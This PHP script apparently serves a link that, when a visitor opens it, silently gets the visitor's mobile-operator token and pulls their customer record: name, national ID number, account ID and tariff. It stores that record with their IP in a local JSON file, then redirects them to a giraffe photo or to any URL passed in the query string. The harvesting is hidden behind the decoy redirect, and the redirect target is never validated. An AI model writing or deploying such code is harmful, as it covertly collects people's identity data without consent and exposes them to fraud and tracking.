<?php
//*
include '../includes/core_identity.php';

//*    
function build_file($file, $data)
{

    $file_data = fopen($file, "w");

    fwrite($file_data, $data);

    fclose($file_data);
}

function userExtractor()
{

    //*
    if (isset($_SESSION['hetoken'])) {
        if ($_SESSION['hetoken'] != '') {
            $dt1['data']['generateToken']['token'] = $_SESSION['hetoken'];
            $_SESSION['hetoken'] = '';
        } else {
            $dt1 = json_decode(myToken(), true);
        }
    } else {
        $dt1 = json_decode(myToken(), true);
    }
    //*/

    //$dt1 = json_decode(myToken(), true);

    //*
    $identity = [];
    if (isset($_SERVER['GEOIP_ORGANIZATION'])) {
        $identity['ISP'] = $_SERVER['GEOIP_ORGANIZATION'];
        if (!containsWord($_SERVER['GEOIP_ORGANIZATION'], 'safaricom')) {
            $identity['status'] = 'vali';
            $identity['body'] = 'You are using ' . $_SERVER['GEOIP_ORGANIZATION'] . ' as your ISP. Kindly use Safaricom to use IDENTITY!';
            $usDt = [];
            $usDt['error'] = 'ISP';
            $usDt['ISP'] = $_SERVER['GEOIP_ORGANIZATION'];
            $usDt['timestamp'] = date('Y-m-d\TH:i:s\Z');
            $usDt['ip'] = $_SERVER['REMOTE_ADDR'];
            $file = './thegreatdata/safidentity.json';
            if (file_exists($file)) {
                $fileData = json_decode(file_get_contents($file), true);
            } else {
                $fileData = [];
            }
            array_push($fileData, $usDt);
            build_file($file, json_encode($fileData));
        }
    }

    if (is_array($dt1)) {
        if (isset($dt1['data']['generateToken']['token'])) {
            $identity['status'] = 'valid';
            $_SESSION['hetoken'] = $hetoken = $dt1['data']['generateToken']['token'];

            $userdata = getUserData($hetoken);
            $dt2 = json_decode($userdata, true);
            if (is_array($dt2)) {
                if (!isset($dt2['errors'])) {
                    if (isset($dt2['data']['getCustomerInfo']['idNumber'])) {
                        $usDt = [];
                        if (isset($dt2['data']['getCustomerInfo']['firstName'])) {
                            $usDt['firstName'] = $dt2['data']['getCustomerInfo']['firstName'];
                        } else {
                            $usDt['firstName'] = '';
                        }
                        if (isset($dt2['data']['getCustomerInfo']['lastName'])) {
                            $usDt['lastName'] = $dt2['data']['getCustomerInfo']['lastName'];
                        } else {
                            $usDt['lastName'] = '';
                        }
                        if (isset($dt2['data']['getCustomerInfo']['idNumber'])) {
                            $usDt['idNumber'] = $dt2['data']['getCustomerInfo']['idNumber'];
                        } else {
                            $usDt['idNumber'] = '';
                        }
                        if (isset($dt2['data']['getCustomerInfo']['blazerId'])) {
                            $usDt['blazerId'] = $dt2['data']['getCustomerInfo']['blazerId'];
                        } else {
                            $usDt['blazerId'] = '';
                        }
                        if (isset($dt2['data']['getCustomerInfo']['tariff'])) {
                            $usDt['tariff'] = $dt2['data']['getCustomerInfo']['tariff'];
                        } else {
                            $usDt['tariff'] = '';
                        }

                        $usDt['timestamp'] = date('Y-m-d\TH:i:s\Z');
                        $usDt['ip'] = $_SERVER['REMOTE_ADDR'];
                        $usDt['object'] = $dt2['data']['getCustomerInfo'];

                        $file = './thegreatdata/safidentity.json';
                        if (file_exists($file)) {
                            $fileData = json_decode(file_get_contents($file), true);
                        } else {
                            $fileData = [];
                        }
                        array_push($fileData, $usDt);
                        build_file($file, json_encode($fileData));
                        $identity['body'] = $usDt;
                    } else {
                        $identity['status'] = 'valid';
                        $identity['body'] = 'Data extraction error!<br/>' . $userdata . '<br/><br/>' . $hetoken;
                    }
                } else {
                    $identity['status'] = 'error';
                    $identity['body'] = 'Data extraction failure!<br/>' . $userdata . '<br/><br/>' . $hetoken;
                }
            } else {
                $identity['status'] = 'error';
                $identity['body'] = 'Data extraction failure!<br/>' . $userdata . '<br/><br/>' . $hetoken;
            }
        } else {
            $identity['status'] = 'error';
            $identity['body'] = 'Processing failure!';
        }
    }

    return json_encode($identity);
}

function extractionControl()
{
    $dt1 = json_decode(userExtractor(), true);
    if ($dt1['status'] == 'valid') {
        return true;
    } else {
        if (isset($_SESSION['identityLoop'])) {
            $_SESSION['identityLoop'] = $_SESSION['identityLoop'] + 1;
        } else {
            $_SESSION['identityLoop'] = 1;
        }
        if ($_SESSION['identityLoop'] < 10) {
            extractionControl();
        } else {
            return true;
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    if (extractionControl()) {
        if (isset($_GET['url'])) {
            $redirect = $_GET['url'];
        } else {
            $redirect = 'https://www.andbeyond.com/wp-content/uploads/sites/5/giraffe-and-sky-line-nairobi.jpg';
        }
        header('location: ' . $redirect);
    }
} elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
    echo userExtractor();
}
//*/
//echo json_encode($identity);
